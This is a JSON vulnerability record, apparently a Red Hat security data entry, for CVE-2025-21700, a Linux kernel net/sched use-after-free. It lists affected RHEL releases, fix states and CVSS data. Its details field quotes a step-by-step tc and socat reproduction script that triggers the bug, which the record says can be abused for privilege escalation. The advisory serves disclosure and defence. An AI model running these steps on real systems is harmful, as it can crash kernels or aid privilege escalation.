{
  "mitigation": "Mitigation for this issue is either not available or the currently available options don't meet the Red Hat Product Security criteria comprising ease of use and deployment, applicability to widespread installation base or stability.",
  "affected_release": null,
  "package_state": [
    {
      "product_name": "Red Hat Enterprise Linux 6",
      "fix_state": "Under investigation",
      "package_name": "kernel",
      "cpe": "cpe:/o:redhat:enterprise_linux:6"
    },
    {
      "product_name": "Red Hat Enterprise Linux 7",
      "fix_state": "Under investigation",
      "package_name": "kernel",
      "cpe": "cpe:/o:redhat:enterprise_linux:7"
    },
    {
      "product_name": "Red Hat Enterprise Linux 7",
      "fix_state": "Under investigation",
      "package_name": "kernel-rt",
      "cpe": "cpe:/o:redhat:enterprise_linux:7"
    },
    {
      "product_name": "Red Hat Enterprise Linux 8",
      "fix_state": "Out of support scope",
      "package_name": "kernel",
      "cpe": "cpe:/o:redhat:enterprise_linux:8"
    },
    {
      "product_name": "Red Hat Enterprise Linux 8",
      "fix_state": "Out of support scope",
      "package_name": "kernel-rt",
      "cpe": "cpe:/o:redhat:enterprise_linux:8"
    },
    {
      "product_name": "Red Hat Enterprise Linux 9",
      "fix_state": "Affected",
      "package_name": "kernel",
      "cpe": "cpe:/o:redhat:enterprise_linux:9"
    },
    {
      "product_name": "Red Hat Enterprise Linux 9",
      "fix_state": "Will not fix",
      "package_name": "kernel-rt",
      "cpe": "cpe:/o:redhat:enterprise_linux:9"
    }
  ],
  "threat_severity": "Moderate",
  "public_date": "2025-02-13T00:00:00Z",
  "bugzilla": {
    "description": "kernel: net: sched: Disallow replacing of child qdisc from one parent to another",
    "id": "2345534",
    "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2345534"
  },
  "cvss": {
    "cvss_base_score": "",
    "cvss_scoring_vector": "",
    "status": ""
  },
  "cvss3": {
    "cvss3_base_score": "6.4",
    "cvss3_scoring_vector": "CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H",
    "status": "draft"
  },
  "iava": "",
  "cwe": "CWE-416",
  "statement": "The attack requires some operations that available only for privileged user (ex. \"tc qdisc replace dev lo parent 1:3 handle 4:0\"), so rated Moderate.",
  "acknowledgement": "",
  "name": "CVE-2025-21700",
  "document_distribution": "",
  "details": [
    "In the Linux kernel, the following vulnerability has been resolved:\nnet: sched: Disallow replacing of child qdisc from one parent to another\nLion Ackermann was able to create a UAF which can be abused for privilege\nescalation with the following script\nStep 1. create root qdisc\ntc qdisc add dev lo root handle 1:0 drr\nstep2. a class for packet aggregation do demonstrate uaf\ntc class add dev lo classid 1:1 drr\nstep3. a class for nesting\ntc class add dev lo classid 1:2 drr\nstep4. a class to graft qdisc to\ntc class add dev lo classid 1:3 drr\nstep5.\ntc qdisc add dev lo parent 1:1 handle 2:0 plug limit 1024\nstep6.\ntc qdisc add dev lo parent 1:2 handle 3:0 drr\nstep7.\ntc class add dev lo classid 3:1 drr\nstep 8.\ntc qdisc add dev lo parent 3:1 handle 4:0 pfifo\nstep 9. Display the class/qdisc layout\ntc class ls dev lo\nclass drr 1:1 root leaf 2: quantum 64Kb\nclass drr 1:2 root leaf 3: quantum 64Kb\nclass drr 3:1 root leaf 4: quantum 64Kb\ntc qdisc ls\nqdisc drr 1: dev lo root refcnt 2\nqdisc plug 2: dev lo parent 1:1\nqdisc pfifo 4: dev lo parent 3:1 limit 1000p\nqdisc drr 3: dev lo parent 1:2\nstep10. trigger the bug \u003c=== prevented by this patch\ntc qdisc replace dev lo parent 1:3 handle 4:0\nstep 11. Redisplay again the qdiscs/classes\ntc class ls dev lo\nclass drr 1:1 root leaf 2: quantum 64Kb\nclass drr 1:2 root leaf 3: quantum 64Kb\nclass drr 1:3 root leaf 4: quantum 64Kb\nclass drr 3:1 root leaf 4: quantum 64Kb\ntc qdisc ls\nqdisc drr 1: dev lo root refcnt 2\nqdisc plug 2: dev lo parent 1:1\nqdisc pfifo 4: dev lo parent 3:1 refcnt 2 limit 1000p\nqdisc drr 3: dev lo parent 1:2\nObserve that a) parent for 4:0 does not change despite the replace request.\nThere can only be one parent.  b) refcount has gone up by two for 4:0 and\nc) both class 1:3 and 3:1 are pointing to it.\nStep 12.  send one packet to plug\necho \"\" | socat -u STDIN UDP4-DATAGRAM:127.0.0.1:8888,priority=$((0x10001))\nstep13.  send one packet to the grafted fifo\necho \"\" | socat -u STDIN UDP4-DATAGRAM:127.0.0.1:8888,priority=$((0x10003))\nstep14. lets trigger the uaf\ntc class delete dev lo classid 1:3\ntc class delete dev lo classid 1:1\nThe semantics of \"replace\" is for a del/add _on the same node_ and not\na delete from one node(3:1) and add to another node (1:3) as in step10.\nWhile we could \"fix\" with a more complex approach there could be\nconsequences to expectations so the patch takes the preventive approach of\n\"disallow such config\".\nJoint work with Lion Ackermann \u003cnnamrec@gmail.com\u003e"
  ],
  "references": [
    "https://www.cve.org/CVERecord?id=CVE-2025-21700\nhttps://nvd.nist.gov/vuln/detail/CVE-2025-21700\nhttps://lore.kernel.org/linux-cve-announce/2025021308-CVE-2025-21700-305d@gregkh/T"
  ]
}